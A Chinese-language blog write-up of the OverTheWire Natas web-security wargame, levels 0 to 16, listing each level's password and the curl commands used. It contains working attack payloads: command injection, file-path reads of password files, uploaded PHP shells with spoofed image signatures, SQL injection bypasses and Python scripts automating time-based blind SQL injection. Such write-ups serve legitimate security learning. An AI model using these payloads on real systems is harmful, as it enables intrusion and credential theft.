---
title: Overthewire Natas 0-16 关
categories: [OS, Linux]
tags: [Linux, web security]
pin: false
---

[natas](https://overthewire.org/wargames/natas/)

这一级的游戏主要是`server side`的Web安全。

# natas level 0 to level 16

## level 0 to 1

natas1: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

书接上回，以命令行为主。

用户名加密码把页面下载下来:

`curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org -o natas0.html`

用htmlq筛选文本内容:

`htmlq -t -f natas0.html`

密码在页面上，筛选注释部分：

`grep '<!--' nata0.html`

## level 1 to 2

natas2: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

同上，抓取页面：

`curl -u natas1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 http://natas1.natas.labs.overthewire.org -o natas1.html`

阅读文本部分：

`htmlq -t -f natas1.html`

根本用不着**rightclick**!

`grep '<!--' natas1.html`

## level 2 to 3

natas3: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

密码不在natas2.html页面上，用curl下载pixel.png，查看图片发现没内容。

查看16进制转存储也没什么发现。

查看files目录：

`curl -u natas2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 http://natas2.natas.labs.overthewire.org/files/ | htmlq -t`

密码就在users.txt里.

## level 3 to 4

natas4: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

提示**No more information leaks!**,碰巧不久前看过[robots.txt](https://zh.wikipedia.org/zh-cn/Robots.txt), 一试又是users.txt文件。

## level 4 to 5

natas5: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

关键词是**visiting from**

一番搜索发现是HTTP里的[Referer](https://en.wikipedia.org/wiki/HTTP_referer)这一头字段([list of HTTP header fields](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields))

查看curl的manual，构造含有符合要求的Referer字段的GET请求：

`curl --get --header 'Referer: http://natas5.natas.labs.overthewire.org/' -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm http://natas4.natas.labs.overthewire.org/index.php | htmlq 'body' | bat -l html`

## level 5 to 6

natas6: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

上一个Access disallowed说得很清楚，从`""`访问不让看，得从他指定的路径去访问。

这一个说**You are not logged in**，不让看。但是明明输入了用户名和密码。

[这篇文章](https://hackmethod.com/overthewire-natas-5/?v=7516fd43adaa)里讲了，现在网站的[session management](https://en.wikipedia.org/wiki/HTTP_cookie#Session_management)就用一个uniq session identifier，用户登录后服务器给你发一个又臭又长的字符串，后台数据库里也存一个，今后访问的时候浏览器把这字符串发送到服务器对对看就知道这个用户登没登录过。

查看curl的manual找找cookie字样，下面的命令在访问页面同时把接收到的cookie输出到stdout：

`curl --cookie-jar - -u natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD http://natas5.natas.labs.overthewire.org/index.php | htmlq 'body' | bat -l html`

一看，输了用户名跟密码但是服务器给的cookied里loggedin为0，所以先把接收的cookied保存下来：

`curl --cookie-jar natas5-cookie -u natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD http://natas5.natas.labs.overthewire.org | htmlq 'body' | bat -l html`

然后把0改成1，下次访问该页面是点名道姓用这个经过修改的cookie作为所谓的uniq session identifier

`curl --cookie natas5-cookie -u natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD http://natas5.natas.labs.overthewire.org/index.php | htmlq 'body' | bat -l html`

## level 6 to 7

natas7: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

查看index.php知道这里要通过POST提交数据，根据提示查看index.php源码：

`curl -u natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR http://natas6.natas.labs.overthewire.org/index-source.html | htmlq -t | bat -l html`

不难看出`$secret`的值来自`includes/secret.inc`

`curl -u natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR http://natas6.natas.labs.overthewire.org/includes/secret.inc | bat -l php`

最后POST，别忘了另一个input，也就是`submit`

`curl -u natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&&submit=1" http://natas6.natas.labs.overthewire.org/index.php | htmlq 'body' | bat -l html`

## level 7 to 8

natas8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

`curl -u natas7:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr http://natas7.natas.labs.overthewire.org/index.php\?page\=/etc/natas_webpass/natas8 | htmlq 'body' | bat -l html`

## level 8 to 9

natas9: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

编解码问题，把`$encodedSecret`按`encodeSecret`函数逆着编码就能得到POST请求中secret字段的值

1. bin2hex函数 [link](https://www.php.net/manual/en/function.bin2hex.php)

把binary data(二进制数据) 转换为hex string representation(16进制字符串表示)

逆过来，hex string -> binary data (在计算机里表示为file)

用xxd -r命令，但是要加-p(-plain)选项，因为这里不是完整的hexdump文件

`xxd -r -p - bin`

输入$encodeSecret的值`3d3d516343746d4d6d6c315669563362`后按Ctrl+D发送EOF信号

2. [strrev](https://www.php.net/manual/en/function.strrev.php) 和 [base64_encode](https://www.php.net/manual/en/function.base64-encode.php) 函数

逆过来操作就是： 倒转字符串+base64解码

`rev bin | base64 -d` 得到secret为`oubWYf2kBq`

## level 9 to 10

natas10: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

[passthru](https://www.php.net/manual/en/function.passthru.php)函数就是执行外部命令然后显示输出。

首先看了一下dictionary.txt，没什么发现。

然后想起命令行是有注释的，所以可以[grep injection](https://en.wikipedia.org/wiki/SQL_injection)一下。

第一个试了当前文件夹：

```bash
curl -u natas9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd \
-X POST -d 'submit=1&&needle=. ./* #' \                        
http://natas9.natas.labs.overthewire.org/index.php \
| htmlq 'body' | bat -l html
```

还尝试了其他目录，发行不通

最后想起密码在`/etc/natas_webpass/`下，并且是有读取相应密码的权限的。

```bash
curl -u natas9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd \
-X POST -d 'submit=1&&needle=. /etc/natas_webpass/natas10 #' \
http://natas9.natas.labs.overthewire.org/index.php \
| htmlq 'body' | bat -l html
```

## level 10 to 11

natas11: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

`/[;|&]/`是[正则表达式](https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F)

这里匹配的是包含`;`，`|`，`&`的字符串。

## level 11 to 12

natas12: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

在这一级上花了不少时间，还跑去[这里](https://regexone.com)学习了正则表达式，然而这一级的正则表达式只是在检查`bgcolor`的值是否符合rgb的16进制形式。

`Cookies are protected with XOR encryption`提示了重点是cookie和xor加密。

下面是页面的源码：

```php
<?

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    // .= 字符串拼接
    $outText .= $text[$i] ^ $key[$i % strlen($key)]; // % 取余会循环key
    }
    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    // 使用cookie，cookie里有data字段
    if(array_key_exists("data", $_COOKIE)) {
    // $tempdata: {"showpassword":"no","bgcolor":"#ffffff"}
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        // ?: 非捕获括号
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    // json_encode: {"showpassword":"no","bgcolor":"#ffffff"} 
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

// 第一次访问没cookie，data为空，所以默认值为$defaultdata
$data = loadData($defaultdata);

// 可以修改默认的$data['bgcolor']值
if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>


<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```

显然需要修改cookie，让showpassword为yes。

如何查看、保存、编辑cookie在前面的level都有涉及到,只差破解xor加密，然后用它达成修改cookie的目的。

查看[xor encrypt](https://zh.wikipedia.org/zh-cn/%E5%BC%82%E6%88%96%E5%AF%86%E7%A0%81)的维基百科页面，不难发现`密文⊕明文`就是加密用的key。

找到key后再加密生成新的cookie就行了。

php代码如下:（如果文本比key还长，将会循环使用key来加密，所以真正的key只是输出字符串中不重复的部分)

```php
<?php

function get_xor_encrypt_key($cipher, $plain) {
    $key = '';
    for($i=0;$i<strlen($cipher);$i++) {
    $key .= $cipher[$i] ^ $plain[$i % strlen($plain)];
    }
    return $key;
}

$cookie = 'MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D';
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

echo "defaultdata: ".'array( "showpassword"=>"no", "bgcolor"=>"#ffffff")'."\n";
echo "json_encode: ".json_encode($defaultdata)."\n";
echo "xor_encrypt+base64_encode=cookie :".$cookie."\n";

echo "\nbase64_decoded cookie: ".base64_decode($cookie)."\n";
echo "xor_encrypt_key: ".get_xor_encrypt_key(base64_decode($cookie), json_encode($defaultdata))."\n";

function xor_encrypt($in) {
    $key = 'KNHL';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    // .= 字符串拼接
    $outText .= $text[$i] ^ $key[$i % strlen($key)]; // % 取余会循环key
    }
    return $outText;
}

$newdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$newcookie = base64_encode(xor_encrypt(json_encode($newdata)));
echo "newcookie: ".$newcookie."\n";

?>
```

## level 12 to 13

natas13: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

开始上传文件了。

先说说如何用curl上传。

之前有form表单时用的都是`-X POST -d "data=test&&submit=1"`,在curl的manual搜索form字样会发现`-F`（`--form`选项），能上传二进制文件并且模仿submit按钮的点击。

下面的命令上传了test.jpg,以及文件名test.jpg

```bash
curl -u natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG \
-F "uploadedfile=@/Users/saul/kali/overthewire/test.jpg" \       
-F 'filename=test.jpg' \    
http://natas12.natas.labs.overthewire.org/index.php \
| htmlq 'body' | bat -l html
```

网页源码：

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    // upload/randomstr.ext
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {}
?>

```

注意到成功上传后会给链接，所以可以写一个php文件上传:

```php
<?php
passthru("cat /etc/natas_webpass/natas13")
?>
```

文件名是随机字符串，但是文件扩展名是由POST中filename字段决定的。如果文件扩展名不是php，即使点击链接服务器也不会把代码给php解释器执行。

点击上传成功后的链接，服务器执行代码输出natas13的密码。

## level 13 to 14

natas14: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

`only accept image files!`

比较源代码（diff/vimdiff/git diff都行）

问题出在[exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php)上，它会查文件签名。

思路还是上传php代码执行，但是要考虑更改文件签名骗过exif_imagetype函数。

不用担心修改hexdump文件后，导致代码无法执行，因为php解释器是找到`<?php`后开始执行，直到`?>`结束。只要php代码块是完整的就行。

get-key.php:

```php
// sldjfsd;fk
<?php

passthru("cat /etc/natas_webpass/natas14")

?>
```

16进制转存储为dump文件：`xxd get-key.php dump`

修改前4个字节为[jpg的文件签名](https://en.wikipedia.org/wiki/List_of_file_signatures)，转存回二进制文件：`xxd -r dump modified`

然后上传就完了.

## level 14 to 15

natas15: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {}
?>
```

从源码来看，是SQL注入，只要查询出的行数大于0就能输出密码。

payload: username=`" or 1=1 -- `

注意`根据SQL标准，注释符 -- 必须后跟至少一个空格或一个控制字符（如换行），否则会被视为普通字符的一部分。`

然后在用curl命令时如果传递的参数含特殊字符的话要用`--data-urlcode`长选项。

```bash
curl -u natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP \
--get  \
--data-urlencode 'username=" or 1=1 -- ' \    
-d 'debug' \                                         
http://natas14.natas.labs.overthewire.org/index.php \
| htmlq 'body' | bat -l html
```

## level 15 to 16

natas16: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

这一次的密码来之不易。

源码：

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {}
?>
```

输出内容跟数据库里的数据没有任何关系，就是说这一次的密码不会在网页显示了。

但是它提示了*users*表的结构，还有*password*呢。

这里要用*blind injection*，也就是盲注。

根据[维基百科](https://en.wikipedia.org/wiki/SQL_injection#Blind_SQL_injection)， **Blind SQL injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker.** 正好符合这里的情况。

盲注分*boolean-based*和*time-based*。

这里是基于时间的，维基百科说盲注是*time-intensive*的，因为它很花时间。

下面的查询（LIKE BINARY是case-sensitive的意思）用时不到一秒

```bash
curl -u natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB \
--get \
-d 'debug' \
--data-urlencode 'username=natas16" AND  IF((SELECT password FROM users WHERE username="natas16") LIKE BINARY "t%", SLEEP(5), 0) -- ' \
http://natas15.natas.labs.overthewire.org/index.php \
| htmlq 'body' | bat -l html
```

所以排除密码以*t*开头的可能性。

而如果换成*T*，用时将大于5秒，从而判断natas16的密码是T开头。

运气不错，接下来向第二个字符推进*Ta*,*Tb*,*...*,*TZ*,*T0*,*T1*,*T...* 直到32个密码字符全部搞定.

可以写一个python脚本来自动执行：

```python
import time
import subprocess
import string

base_command = """
curl -u natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB \
--silent \
--get \
-d 'debug' \
--data-urlencode 'username=natas16" AND  IF((SELECT password FROM users WHERE username="natas16") LIKE BINARY "{0}%", SLEEP(5), 0) -- ' \
http://natas15.natas.labs.overthewire.org/index.php > /dev/null
"""

password = ''

while len(password) < 32:
    for c in string.ascii_letters + string.digits:
        progress = password + c
        print(f"进度[{len(password)}/32] {progress}")
        start_time = time.time()
        command = base_command.format(progress)
        subprocess.run(command, shell=True)
        end_time = time.time()
        time_taken = end_time - start_time
        print(f"Time taken: {time_taken}")
        if time_taken > 5:
            password += c
print(f"Password: {password}")
```

单线程太慢（甚至连正确率都非常低），可以换成多线程：

```python
import time
import subprocess
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

base_command = """
curl -u natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB \
--silent \
--get \
-d 'debug' \
--data-urlencode 'username=natas16" AND IF((SELECT password FROM users WHERE username="natas16") LIKE BINARY "{0}%", SLEEP(10), 0) -- ' \
http://natas15.natas.labs.overthewire.org/index.php > /dev/null
"""

password = 'TRD7iZrd5gATjj9PkPEu'
characters = string.ascii_letters + string.digits

def test_character(progress):
    command = base_command.format(progress)
    start_time = time.time()
    subprocess.run(command, shell=True)
    end_time = time.time()
    time_taken = end_time - start_time
    return (progress[-1], time_taken)

# 主循环，当密码长度小于32时，继续循环
while len(password) < 32:
    # 创建一个线程池，最大工作线程数为64
    with ThreadPoolExecutor(max_workers=64) as executor:
        # 提交任务到线程池，每个任务都是调用test_character函数，参数是当前密码加上一个字符
        futures = {executor.submit(test_character, password + c): c for c in characters}
        # 遍历已完成的future
        for future in as_completed(futures):
            # 获取future对应的字符
            c = futures[future]
            try:
                # 获取future的结果，即test_character函数的返回值
                result_char, time_taken = future.result()
                # 打印测试信息
                print(f"Trying[{len(password)}/32] {password + c}, Time taken: {time_taken}")
                # 如果运行命令的时间超过10秒，说明这个字符在密码中，将其添加到密码中
                if time_taken > 10:
                    password += result_char
                    print(f"Current password: {password}")
                    break
            except Exception as e:
                # 如果出现异常，打印错误信息
                print(f"Error testing character {c}: {e}")
```

1. `SLEEP(10)`是因为当线程增加，服务器响应时间也相应地会增加，多睡会降低出错几率。
2. `password = 'TRD7iZrd5gATjj9PkPEu'`是因为之前解密失败，解出的32位密码是错误的。好在不用从头来过，经验证，前20位是正确的，于是在这20位的基础上继续解密。
3. `max_workers=64`服务器对并发请求数似乎没有限制。

这一级花了不少时间，根据[维基百科blind injection部分的两个外部链接](https://en.wikipedia.org/wiki/SQL_injection#Blind_SQL_injection), 可以[一次盲注multiple bits](https://web.archive.org/web/20160708190141/http://howto.hackallthethings.com/2016/07/extracting-multiple-bits-per-request.html), 还有[sqlbrute自动盲注](https://web.archive.org/web/20080614203711/http://www.justinclarke.com/archives/2006/03/sqlbrute.html),源码在[这里](https://github.com/GDSSecurity/SQLBrute/blob/bbfc552e8512bdd403b392765b64d3bcc99b0279/sqlbrute.py)

还可以用[sqlmap](https://medium.com/hacker-toolbelt/natas-15-sql-injection-with-sqlmap-66cb4f89e3f7)来注, [这里](https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/29/natas15/)则是用python，但是没有使用外部命令.

Wargame暂告一个段落，之后要是又玩了再继续分享。
